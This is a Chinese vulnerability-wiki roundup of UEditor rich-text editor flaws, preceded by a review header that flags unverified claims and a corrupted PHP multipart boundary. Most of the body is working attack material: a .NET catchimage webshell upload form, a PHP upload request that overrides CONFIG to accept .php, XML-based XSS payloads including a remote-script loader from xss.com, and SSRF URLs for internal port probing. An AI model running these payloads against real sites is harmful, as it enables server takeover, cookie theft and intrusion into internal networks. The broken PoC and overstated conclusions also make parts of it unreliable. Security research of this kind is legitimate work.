---
source: "Threekiii/Vulnerability-Wiki"
product: "UEditor / .NET-PHP上传、XML-XSS、SSRF"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Ueditor-编辑器漏洞总结"
prerequisites: "来源所述条件，未列明部分仍待核：NET列1.4.3.3/1.5.0/1.3.6；JSP SSRF1.4.3修复1.4.3.1；PHP/OneThink另分支需明确"
side_effects: "未执行；本文需注意的操作影响：PHP任意上传缺关键PHP配置前提；CONFIG查询覆盖需具体历史代码及register_globals等条件证明，不能通用于PHP后端；multipart分隔符破损"
source_status: "unknown"
id: "vw-ae98ca2e9247c045774ca83a"
entity_id: "ve-ae98ca2e9247c045774ca83a"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：NET列1.4.3.3/1.5.0/1.3.6；JSP SSRF1.4.3修复1.4.3.1；PHP/OneThink另分支需明确

代码与实验材料：完整多变体，PHP multipart被Unicode破折号和空行损坏，截图未视检

来源证据范围：只有归档来源，缺每链原始报告/修复commit

- **证据待核（1）**：列目录被误称文件读取；依据：listfile/listimage是列出文件，不等于任意文件内容读取。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **操作与副作用边界（2）**：PHP任意上传缺关键PHP配置前提；依据：CONFIG查询覆盖需具体历史代码及register_globals等条件证明，不能通用于PHP后端；multipart分隔符破损。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **事实待核（3）**：SSRF范围串语言；依据：先给JSP1.4.3范围再混PHP路径和OneThink1.2，需独立组件版本矩阵。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（4）**：回显错误不能直接映射端口状态；依据：远程错误可能受HTTP状态、内容类型、重定向、超时影响，三种字符串不足证明开放/关闭。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Ueditor 编辑器漏洞总结

## 漏洞描述

UEditor 是由百度「FEX前端研发团队」开发的所见即所得富文本web编辑器，具有轻量，可定制，注重用户体验等特点，开源基于MIT协议，允许自由使用和修改代码。

界面如下：

![ueditor-1](./.resource/Ueditor-编辑器漏洞总结/media/ueditor-1.webp)


## 漏洞复现

### 0x01 文件读取漏洞

file 目录文件读取：

```
http://www.xxxx.com/net/controller.ashx?action=listfile
```

image 目录文件读取：

```
http://www.xxxx.com/ueditor/net/controller.ashx?action=listimage
```

### 0x02 .net版本 任意文件上传

只适用于 .net 版本，存在于`1.4.3.3`、`1.5.0`和`1.3.6`版本中。

准备一台服务区存放图片马或者需要上传的文件，本地构造一个 `html` 页面用于上传使用

```html
<form action="http://www.xxxx.com/ueditor/net/controller.ashx?action=catchimage" enctype="application/x-www-form-urlencoded" method="POST">

    <p>shell addr: <input type="text" name="source[]" /></p>

    <input type="submit" value="Submit" />

</form>
```

![ueditor-2](./.resource/Ueditor-编辑器漏洞总结/media/ueditor-2.webp)


- `shell addr` 处填写服务器上图片码地址，构造成以下格式，绕过上传使其解析为 `aspx`

```
http://xxxx/1.gif?.aspx
```

- 成功上传返回上传路径，可直连 getshell

![ueditor-3](./.resource/Ueditor-编辑器漏洞总结/media/ueditor-3.webp)


### 0x03 php版本文件上传

poc：

```
POST http://localhost/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=ueditor/php/upload/fuck&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=fuck HTTP/1.1
Host: localhost
Connection: keep-alive
Content-Length: 222
Cache-Control: max-age=0
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/60.0.3112.78 Safari/537.36
Content-Type: multipart/form-data; boundary=——WebKitFormBoundaryDMmqvK6b3ncX4xxA
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
———WebKitFormBoundaryDMmqvK6b3ncX4xxA
Content-Disposition: form-data; name="fuck"; filename="fuck.php"
Content-Type: application/octet-stream
<?php 
phpinfo();
?>
———WebKitFormBoundaryDMmqvK6b3ncX4xxA—

shell路径由CONFIG[imagePathFormat]=ueditor/php/upload/fuck决定
http://localhost/ueditor/php/upload/fuck.php
```

### 0x03 存储型xss

```
<html>

<head></head>

<body>
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>

</html>

盲打 Cookie、src=""：
<something:script src="" xmlns:something="http://www.w3.org/1999/xhtml"></something:script>
```

上传点：

```
/ueditor/index.html
/ueditor/asp/controller.asp?action=uploadimage
/ueditor/asp/controller.asp?action=uploadfile

/ueditor/net/controller.ashx?action=uploadimage
/ueditor/net/controller.ashx?action=uploadfile

/ueditor/php/controller.php?action=uploadfile
/ueditor/php/controller.php?action=uploadimage

/ueditor/jsp/controller.jsp?action=uploadfile
/ueditor/jsp/controller.jsp?action=uploadimage
```

将`uploadimage`类型改为`uploadfile`，修改文件后缀名为`.xml`：

![ueditor-4](./.resource/Ueditor-编辑器漏洞总结/media/ueditor-4.webp)


上传成功，访问成功弹框：

![ueditor-5](./.resource/Ueditor-编辑器漏洞总结/media/ueditor-5.webp)


#### 一些常见的xml弹窗poc

弹窗xss：

```
<html><head></head><body><something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1);</something:script></body></html>
```

url跳转：

```
<html><head></head><body><something:script xmlns:something="http://www.w3.org/1999/xhtml">window.location.href="https://www.t00ls.net/";</something:script></body></html>
```

远程加载js：

```
<html><head></head><body><something:script src="http://xss.com/xss.js" xmlns:something="http://www.w3.org/1999/xhtml"></something:script></body></html>
```

### 0x04 ssrf

该漏洞存在于`1.4.3`的`jsp版本`中，`1.4.3.1`版本已经修复。

该版本ueditor的ssrf触发点：

```php
/jsp/controller.jsp?action=catchimage&source[]=
/jsp/getRemoteImage.jsp?upfile=
/php/controller.php?action=catchimage&source[]=
```

使用百度logo构造poc：

```
http://xxx/cmd/ueditor/jsp/controller.jsp?action=catchimage&source[]=https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png
```

内网端口探测：

```
/ueditor/jsp/getRemoteImage.jsp?upfile=http://127.0.0.1/favicon.ico?.jpg
/ueditor/jsp/controller.jsp?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif
/ueditor/php/controller.php?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif
```

判断该地址对应的主机端口是否开放：

- 如果抓取不存在的图片地址时，页面返回如下，即state为"远程连接出错"。

```
{"state": "SUCCESS", list:[{"state":"\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519"} ]}
```

- 如果成功抓取到图片，页面返回如下，即state为"SUCCESS"。

```
{"state": "SUCCESS", list: [{"state":"SUCCESS","size":"5103","source":"http://192.168.135.133:8080/tomcat.png","title":"1527173588127099881.png","url":"/ueditor/jsp/upload/image/20180524/1527173588127099881.png"}]}
```

- 如果主机无法访问，页面返回如下，即state为"抓取远程图片失败"。

```
{"state":"SUCCESS", list: [{"state":"\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25"}]}
```

还有一个版本的ssrf漏洞 ，存在于onethink 1.0中的ueditor，测试版本为1.2。poc：

```
POST http://xxx/Public/static/ueditor/php/getRemoteImage.php HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Connection: keep-alive

upfile=https://www.google.com/?%23.jpg
```


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
